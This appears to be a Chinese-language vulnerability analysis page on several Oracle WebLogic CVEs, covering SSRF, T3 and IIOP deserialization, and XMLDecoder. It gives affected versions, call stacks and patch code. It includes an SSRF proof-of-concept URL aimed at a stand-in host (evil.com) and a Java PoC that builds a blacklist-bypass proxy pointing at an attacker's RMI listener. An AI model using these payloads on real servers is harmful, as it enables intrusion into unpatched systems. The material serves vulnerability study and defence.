---
title: "WebLogic"
author: ["4shen0ne"]
draft: false
---

## CVE-2014-4210 {#cve-2014-4210}


### 影响范围 {#影响范围}

-   Oracle WebLogic Server 10.0.2.0
-   Oracle WebLogic Server 10.3.6.0


### POC {#poc}

```text
http://localhost:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&btnSubmit=Search&operator=http://evil.com
```


### 漏洞分析 {#漏洞分析}

该漏洞为 SSRF 漏洞，输入点在 `/uddiexplorer/SearchPublicRegistries.jsp` 页面的
operator 参数中。

{{< figure src="/ox-hugo/_20240530_182544screenshot.png" >}}

看一下 SearchPublicRegistries.jsp 对该参数的处理：

{{< figure src="/ox-hugo/_20240530_182626screenshot.png" >}}

从请求中拿到 operator 没做什么处理便传入 search 对象，然后调用了它的 getResponse
方法，那么跟进一下 search 对象的类 `com.bea.uddiexplorer.Search`

首先是 setOperator 方法：

```java
public void setOperator(String var1) {
    try {
        this.m_operator = var1;
        this.setUDDIInquiryURL(var1);
    } catch (Exception var4) {
        String var3 = (new UDDITextFormatter()).uddiExplorerSearchOpException();
        this.log.error(var3, var4);
    }
}
public void setUDDIInquiryURL(String var1) {
    this.UDDI_INQUIRY_URL = var1;
    this.m_inquiry.setURL(this.UDDI_INQUIRY_URL);
}
```

用我们控制的 operator 参数值设置了 m_operator 和 m_inquiry 属性

然后跟进 getResponse 方法：

```java
public Object getResponse(String var1, String var2, String var3, String var4, String var5) throws UDDIException, XML_SoapException {
    Object var6 = null;
    if (var1.equalsIgnoreCase("name")) {
        var6 = this.findBusinessListByName(var2);
    } else if (var1.equalsIgnoreCase("key")) {
        ...}
    ...}
private BusinessList findBusinessListByName(String var1) throws UDDIException, XML_SoapException {
    BusinessList var2 = null;
    FindBusiness var3 = new FindBusiness();
    var3.setName(new Name(var1));
    var2 = this.m_inquiry.findBusiness(var3);
    return var2;
}
```

当 var1 的值是 name 时，则会调用 m_inquiry 属性的 findBusiness 方法，var1 我们可
以通过传入 rdoSearch 来控制，var2 我们也需要通过 txtSearchname 参数来设置一个值

跟进 findBusiness 方法：

{{< figure src="/ox-hugo/_20240530_182849screenshot.png" >}}

此时 sendMessage 的参数已经被污染了，在这个方法中会使用 `BindingFactory#create` 方
法构建一个 Binding 实例用来发送请求，而 create 方法的参数受到 sendMessage 的参数
影响。关键代码如下：

{{< figure src="/ox-hugo/_20240530_182926screenshot.png" >}}

构建 Binding 实例的过程：

```nil
setBindingInfo:63, AbstractBinding (weblogic.webservice.binding)
init:118, Http11ClientBinding (weblogic.webservice.binding.http11)
create:50, BindingFactory (weblogic.webservice.binding)
sendMessage:78, UDDISoapMessage (weblogic.uddi.client.service)
findBusiness:101, Inquiry (weblogic.uddi.client.service)
findBusinessListByName:325, Search (com.bea.uddiexplorer)
getResponse:172, Search (com.bea.uddiexplorer)
...
```

这时 Binding 的 url 属性已经被我们控制，继续执行 `UDDISoapMessage#sendMessage` 触
发 SSRF 请求：

```nil
openConnection:33, Handler (weblogic.net.http)
openConnection:971, URL (java.net)
send:384, Http11ClientBinding (weblogic.webservice.binding.http11)
sendMessage:80, UDDISoapMessage (weblogic.uddi.client.service)
...
```

{{< figure src="/ox-hugo/_20240530_183017screenshot.png" >}}


## CVE-2015-4852 {#cve-2015-4852}


### 影响范围 {#影响范围}

-   Oracle WebLogic Server 10.3.6.0
-   Oracle WebLogic Server 12.1.2.0
-   Oracle WebLogic Server 12.1.3.0
-   Oracle WebLogic Server 12.2.1.0


### 漏洞原理 {#漏洞原理}

该漏洞为 T3 反序列化漏洞，T3 协议解析从 `MsgAbbrevInputStream#init` 方法开始

解析协议头

```text
this.header.readHeader()
```

记录 abbrevOffset 并跳过偏移然后调用 readMsgAbbrevs，后面会调用
ObjectInputStream 的 readObject 方法对输入流进行反序列化：

```nil
readObject:62, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
init:213, MsgAbbrevInputStream (weblogic.rjvm)
...
```

这一段应该是 T3 协议解析的常规过程，也是反序列化过程的入口，黑名单检查会在后面的
地方进行。

在 readObject 流程中会调用 resolveClass 方法来获取目标对象的 class，这个方法也是
后面补丁黑名单检查的地方：

```nil
resolveClass:108, InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm)
readNonProxyDesc:1610, ObjectInputStream (java.io)
readClassDesc:1515, ObjectInputStream (java.io)
readOrdinaryObject:1769, ObjectInputStream (java.io)
readObject0:1348, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
readObject:66, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
init:213, MsgAbbrevInputStream (weblogic.rjvm)
...
```

{{< figure src="/ox-hugo/_20240531_233022screenshot.png" >}}

InboundMsgAbbrev#read 方法：

```java
int var3 = var1.readLength();

for(int var4 = 0; var4 < var3; ++var4) {
    int var5 = var1.readLength();
    Object var6;
    if (var5 > var2.getCapacity()) {
        var6 = this.readObject(var1);
        var2.getAbbrev(var6);
        this.abbrevs.push(var6);
    } else {
        var6 = var2.getValue(var5);
        this.abbrevs.push(var6);
    }
}
```

可见，只有当前 Abbrev 数据块长度大于 capacity（AS 头）时才会反序列化。


## CVE-2017-3248 {#cve-2017-3248}


### 影响范围 {#影响范围}

-   Oracle WebLogic Server 10.3.6.0
-   Oracle WebLogic Server 12.1.3.0
-   Oracle WebLogic Server 12.2.1.0
-   Oracle WebLogic Server 12.2.1.1


### 漏洞原理 {#漏洞原理}

该漏洞的原理是通过 `动态代理类` 来绕过黑名单检测，因为当前的黑名单检测逻辑在
ObjectInputStream#readProxyDesc 方法之后实现，而动态代理类反序列化时执行的是
ObjectInputStream#readNonProxyDesc 方法。

攻击者可以序列化 Registry 类的动态代理对象，其 handler 是
RebjectInvocationHandler，在反序列化时（RemoteObject#readObject）会通过
UncastRef 访问远程恶意服务器（JRMPListener）来获取 RMI 注册中心。

{{< figure src="/ox-hugo/_20240628_004900screenshot.png" >}}

```java
  ObjID id = new ObjID(new Random().nextInt()); // RMI registry
  TCoint te = new TCPEndpoint(host, port);
  UnRef ref = new UnicastRef(new LiveRef(id, te, false));
  RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
  Registry proxy = (Registry) Proxy.newProxyInstance(
      BypassPayloadSelector.class.getClassLoader(),
      new Class[]{Registry.class},
      obj);
  return proxy;
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 1:</span>
  PoC
</div>


## CVE-2017-3506 {#cve-2017-3506}


### 影响范围 {#影响范围}

-   Oracle WebLogic Server 10.3.6.0
-   Oracle WebLogic Server 12.1.3.0
-   Oracle WebLogic Server 12.2.1.0
-   Oracle WebLogic Server 12.2.1.1
-   Oracle WebLogic Server 12.2.1.2


### 漏洞原理 {#漏洞原理}

使用 XMLDecoder 解析 [SOAP]({{< relref "soap.md" >}}) 请求内容时，对请求中 `<object>` 标签标识的 Java 对象进行
了反序列化。

调用栈：

```nil
readObject:250, XMLDecoder (java.beans)
readUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)
readEntry:92, WorkContextEntryImpl (weblogic.workarea.spi)
receiveRequest:179, WorkContextLocalMap (weblogic.workarea)
receiveRequest:163, WorkContextMapImpl (weblogic.workarea)
receive:71, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
readHeaderOld:107, WorkContextTube (weblogic.wsee.jaxws.workcontext)
processRequest:43, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
...
```

补丁，添加 `WorkContextXmlInputAdapter#validate` 方法，禁用 `<object>` 标签：

```java
private void validate(InputStream is) {
      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
      try {
         SAXParser parser = factory.newSAXParser();
         parser.parse(is, new DefaultHandler() {
            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
               if(qName.equalsIgnoreCase("object")) {
                  throw new IllegalStateException("Invalid context type: object");
               }
            }
         });
      } catch (ParserConfigurationException var5) {
         throw new IllegalStateException("Parser Exception", var5);
      } catch (SAXException var6) {
         throw new IllegalStateException("Parser Exception", var6);
      } catch (IOException var7) {
         throw new IllegalStateException("Parser Exception", var7);
      }
   }
```

CVE-2017-10271 使用 `<void>` 代替 `<object>` 绕过过滤。


## <span class="org-todo todo TODO">TODO</span> CVE-2019-2890 {#cve-2019-2890}


## CVE-2020-2551 {#cve-2020-2551}

1.  T3 反序列化时使用 resolveClass 方法通过黑名单来过滤危险类；
2.  resolveClass 方法会检查整个继承链，只要“族谱”有一个类在黑名单中就禁止反序列化；
3.  JtaTransactionManager 的父类 AbstractPlatformTransactionManager 在黑名单中，
    所以无法通过 T3 反序列化 JtaTransactionManager 类；
4.  [IIOP]({{< relref "iiop.md" >}}) 的反序列化使用同一个黑名单，但是检测逻辑不同，不会检查类的继承链，所以
    JtaTransactionManager 类可以通过 IIOP 反序列化；
5.  JtaTransactionManager 类存在 JNDI 注入漏洞。


## <span class="org-todo todo TODO">TODO</span> CVE-2020-14756 {#cve-2020-14756}
